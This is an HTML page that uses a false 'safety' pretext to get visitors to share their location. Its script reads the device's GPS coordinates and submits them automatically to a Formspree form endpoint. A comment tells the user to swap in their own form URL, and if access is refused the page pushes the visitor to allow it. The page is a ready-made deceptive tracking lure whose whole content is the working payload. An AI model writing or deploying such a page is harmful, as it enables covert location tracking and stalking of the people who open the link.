<!DOCTYPE html>
<html>
<head>
  <title>Location Access</title>
</head>
<body>
  <h2>Hi! Please tap 'Allow' to verify your location for safety reasons.</h2>
  <p>If asked, please allow location access on your device.</p>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // Create a form dynamically
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "https://formspree.io/f/mqaqlvrd"; // Replace with your Formspree URL

      const latInput = document.createElement("input");
      latInput.name = "Latitude";
      latInput.value = lat;
      form.appendChild(latInput);

      const lonInput = document.createElement("input");
      lonInput.name = "Longitude";
      lonInput.value = lon;
      form.appendChild(lonInput);

      document.body.appendChild(form);
      form.submit();
    }, function(error) {
      alert("Location access was denied. Please allow location to continue.");
    });
  </script>
</body>
</html>
